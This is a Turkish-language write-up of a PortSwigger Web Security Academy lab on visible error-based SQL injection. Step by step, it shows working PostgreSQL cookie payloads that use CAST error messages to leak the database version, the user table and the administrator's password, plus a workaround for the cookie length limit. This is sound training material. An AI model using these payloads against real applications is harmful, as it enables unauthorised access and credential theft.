# Write-Up: Visible Error-Based SQL Injection
**Platform:** PortSwigger Web Security Academy
**Difficulty:** Practitioner
**Tool:** Burp Suite — Repeater

---

## Lab Hedefi

Bu lab'da hedef, `TrackingId` cookie'si üzerinden SQL injection yaparak `users` tablosundaki `administrator` kullanıcısının şifresini çalmak ve sisteme giriş yapmak.

---

## Injection Noktası

Uygulama her sayfa yüklemesinde bir `TrackingId` cookie'si gönderiyor:

```http
Cookie: TrackingId=WPzkvPb8Blixje4c; session=...
```

Bu değer veritabanına şu şekilde gönderiliyor:

```sql
SELECT * FROM tracking WHERE id = 'WPzkvPb8Blixje4c'
```

---

## ADIM 1 — Detection: Tek Tırnak ile Hata Tespiti

`TrackingId` değerinin sonuna tek tırnak (`'`) ekliyoruz:

```http
Cookie: TrackingId=WPzkvPb8Blixje4c'
```

**Sonuç:** `500 Internal Server Error` + açık hata mesajı:

> *Unterminated string literal started at position 52 in SQL SELECT \* FROM tracking WHERE id = 'WPzkvPb8Blixje4c''. Expected char*

![Tek tırnak ile hata alındı](media/01-single-quote-error.png)

**Analiz:**
- Hata mesajı SQL sorgusunu **doğrudan ekrana yansıtıyor** → visible error-based SQLi
- Uygulama girdiyi sanitize etmiyor
- DB türünün PostgreSQL olduğu hata syntax'ından anlaşılıyor

---

## ADIM 2 — String Context Doğrulama: Çift Tırnak ile Dengeleme

Tek tırnak yerine iki tane (`''`) gönderiyoruz. Bu PostgreSQL'de `''` kaçış karakteri olarak çalışır ve sorguyu dengeler:

```http
Cookie: TrackingId=WPzkvPb8Blixje4c''
```

**Sonuç:** `200 OK` → Normal sayfa döndü, hata yok

![Çift tırnak ile normal response](media/02-double-quote-ok.png)

**Analiz:**
- Sorgu dengelendi → string context içindeyiz
- Girdi tırnak içine alınmış durumda, enjeksiyon buradan yapılacak

---

## ADIM 3 — Comment ile Kontrolü Ele Geçirme

`'--` ile tırnak kapatıp geri kalan sorguyu yorum satırına alıyoruz:

```http
Cookie: TrackingId=WPzkvPb8Blixje4c'--
```

**Sonuç:** `200 OK` → Sorgunun geri kalanı etkisizleştirildi

![Comment ile sorgu kapatıldı](media/03-comment-closed.png)

**Analiz:**
- `--` comment çalışıyor → sorgu üzerinde tam kontrol sağlandı
- Artık `WHERE` koşuluna istediğimiz mantığı ekleyebiliriz

---

## ADIM 4 — WAF Tespiti: String Concatenation

`||` operatörü ile SELECT'i test ediyoruz:

```http
Cookie: TrackingId=WPzkvPb8Blixje4c'||(SELECT '')--
```

**Sonuç:** `200 OK` → WAF yok, SELECT geçti, PostgreSQL/MySQL doğrulandı

![WAF testi — SELECT geçti, normal response](media/04-waf-test.png)

---

## ADIM 5 — Conditional Test: AND 'a'='a / AND 'a'='b

Boolean davranışını test ediyoruz:

```http
Cookie: TrackingId=WPzkvPb8Blixje4c' AND 'a'='a--   → TRUE koşul
Cookie: TrackingId=WPzkvPb8Blixje4c' AND 'a'='b--   → FALSE koşul
```

**TRUE koşul — `AND 'a'='a`:**

![TRUE koşul — 200 OK, normal response](media/05-true-condition.png)

**FALSE koşul — `AND 'a'='b`:**

![FALSE koşul — 200 OK, aynı response!](media/06-false-condition.png)

> [!IMPORTANT]
> **Her iki koşul da aynı response'u döndürüyor.** Bu demek ki uygulama TRUE/FALSE ayrımını yansıtmıyor → **Boolean-Based Blind SQLi bu lab'da çalışmıyor.** Tek geçerli yöntem **Error-Based** yaklaşım.

---

## ADIM 6 — DB Türü Tespiti: CAST(version())

`version()` fonksiyonunu integer'a cast etmeye çalışıyoruz:

```http
Cookie: TrackingId=WPzkvPb8Blixje4c' AND 1=CAST(version() AS int)--
```

**Hata Mesajı:**
> *ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"*

![DB türü tespiti — PostgreSQL 12.22 doğrulandı](media/07-db-type-detected.png)

**Analiz:** DB türü **PostgreSQL 12.22** olarak kesin doğrulandı. Bundan sonraki tüm payloadlar PostgreSQL syntax'ına göre yazılacak.

---

## ADIM 7 — `users` Tablosunun Varlığını Doğrulama

```http
Cookie: TrackingId=' AND 1=CAST((SELECT 1 FROM users LIMIT 1) AS int)--
```

**Sonuç:** `200 OK` → Hata yok!

![users tablosu doğrulandı — 200 OK](media/08-users-table-confirmed.png)

**Analiz:**
- `SELECT 1 FROM users LIMIT 1` → `1` döndürdü (tablo var ve erişilebilir)
- `CAST(1 AS int)` → zaten integer, hata yok
- `1=1` → TRUE → sorgu başarılı → **users tablosu kesin mevcut** ✅

> [!CAUTION]
> **Karakter Limiti Problemi:** Aynı payload `TrackingId` değeri silinmeden gönderildiğinde, payload karakter limitini aşıp `AS int)--` kısmı kesiliyor ve syntax error oluşuyor:
>
> *Unterminated string literal started at position 95 in SQL SELECT \* FROM tracking WHERE id = 'WPzkvPb8Blixje4c' AND 1=CAST((SELECT 1 FROM users LIMIT 1) A'. Expected char*
>
> **Çözüm:** `TrackingId` değerini tamamen silerek sadece payload'ı göndermek — bu hem limiti çözer hem de sonraki adımlarda şifre gibi uzun değerlerin tam okunmasını sağlar.

![Karakter limiti nedeniyle payload kesildi](media/09-char-limit-issue.png)

---

## ADIM 8 — `administrator` Kullanıcısının Varlığını Doğrulama

`username` kolonunu direkt integer'a cast ediyoruz — hata mesajı kullanıcı adını söyler:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**Sonuç:**

![administrator kullanıcısı doğrulandı](media/10-admin-user-confirmed.png)

> *ERROR: invalid input syntax for type integer: "administrator"*

→ Tek hamlede hem `username` kolonu doğrulandı hem de `administrator` kullanıcısının var olduğu teyit edildi ✅

> [!NOTE]
> `WHERE username='administrator'` koşulu eklemek hem gereksiz hem de 61 karakterlik cookie limitini aşıyor. Bunun yerine `username` kolonunu doğrudan CAST ediyoruz — hata mesajı zaten bize kullanıcı adını söylüyor. Bu yöntem hem daha kısa (52 karakter) hem de daha bilgi verici.
>
> **İpucu:** Önceki denemelerde `WHERE username='administrator'` ile gelen `syntax error at end of input Position: 97` hatası, payload'ın tam `administrator` kelimesinin ortasında (61. karakterde) kesildiğini gösteriyordu. Base query 36 karakter olduğundan uygulama cookie değerini 61 karakterde kesiyor.

---

## ADIM 9 — Şifre Çekme (Final Exploit)

`WHERE` koşulu olmadan, sadece `LIMIT 1` ile ilk kullanıcının şifresini çekiyoruz:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Sonuç:**

![Şifre hata mesajında görünüyor](media/11-password-leaked.png)

> *ERROR: invalid input syntax for type integer: "ggnw9ao87zkxgl38nqdu"*

→ **Şifre: `ggnw9ao87zkxgl38nqdu`** 🎉

> [!NOTE]
> `WHERE username='administrator'` koşulu eklenmeden sadece `LIMIT 1` kullandık. Adım 8'de zaten ilk kullanıcının `administrator` olduğunu doğrulamıştık, dolayısıyla bu şifre `administrator`'a ait.

---

## ADIM 10 — Login & Lab'ı Çözme

Elde edilen kimlik bilgileriyle login sayfasına gidilir:

```
Username: administrator
Password: <hata mesajından okunan şifre>
```

→ Başarılı giriş → Lab **Solved** ✅

---

## Özet

| Adım | Payload | Sonuç |
|------|---------|-------|
| Detection | `'` | 500 Error → SQLi var |
| String context | `''` | 200 OK → dengelendi |
| Comment | `'--` | 200 OK → tam kontrol |
| WAF testi | `'\|\|(SELECT '')--` | 200 OK → WAF yok |
| Conditional | `AND 'a'='a` vs `AND 'a'='b` | Aynı response → boolean-based blind çalışmıyor |
| DB türü | `CAST(version() AS int)` | Hata → PostgreSQL |
| Tablo varlığı | `FROM users LIMIT 1` | Hata yok → tablo var |
| Admin varlığı | `SELECT username FROM users LIMIT 1` | Hata → kullanıcı var |
| Şifre | `SELECT password FROM users LIMIT 1` | Hata → şifre görünüyor 🎉 |

---

## Key Takeaway

> Bu lab'da zafiyet, uygulamanın **veritabanı hata mesajlarını doğrudan HTTP response'a yansıtmasından** kaynaklanıyor. `CAST()` fonksiyonu ile string değerleri integer'a çevirmeye çalışarak, veritabanının fırlattığı hata mesajı içinde hassas veriyi okuyabiliyoruz. Normalde görünmez olan bu veri, **visible error** sayesinde açığa çıkıyor.
